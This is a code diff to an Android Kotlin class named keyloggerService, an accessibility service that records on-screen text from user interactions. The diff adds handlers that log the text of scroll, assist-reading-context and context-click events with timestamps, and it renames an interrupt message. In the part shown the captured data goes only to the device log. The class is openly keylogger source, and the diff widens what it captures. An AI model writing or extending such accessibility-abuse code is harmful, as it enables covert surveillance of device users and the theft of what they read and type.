@@ -31,11 +31,31 @@ class keyloggerService : AccessibilityService() {
                 val data = event.text.toString()
                 i(TAG, "${getDateTime()} |(CLICKED)| $data")
             }
+
+            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
+                val data = event.text.toString()
+                if (data != "[]"){
+                    i(TAG, "${getDateTime()} |(SCROLLED)| $data")
+                }
+
+            }
+
+            AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT -> {
+                val data = event.text.toString()
+                i(TAG, "${getDateTime()} |(TYPE_ASSIST_READING_CONTEXT)| $data")
+            }
+
+
+            AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED-> {
+                val data = event.text.toString()
+                i(TAG, "${getDateTime()} |(CONTEXT_CLICKED)| $data")
+            }
         }
     }
 
     override fun onInterrupt() {
-        Log.i(TAG, "onInterrupt: Keylogger Disconnected")
+        Log.i(TAG, "onInterrupt: Keylogger interrupted")
     }
+
 
 }
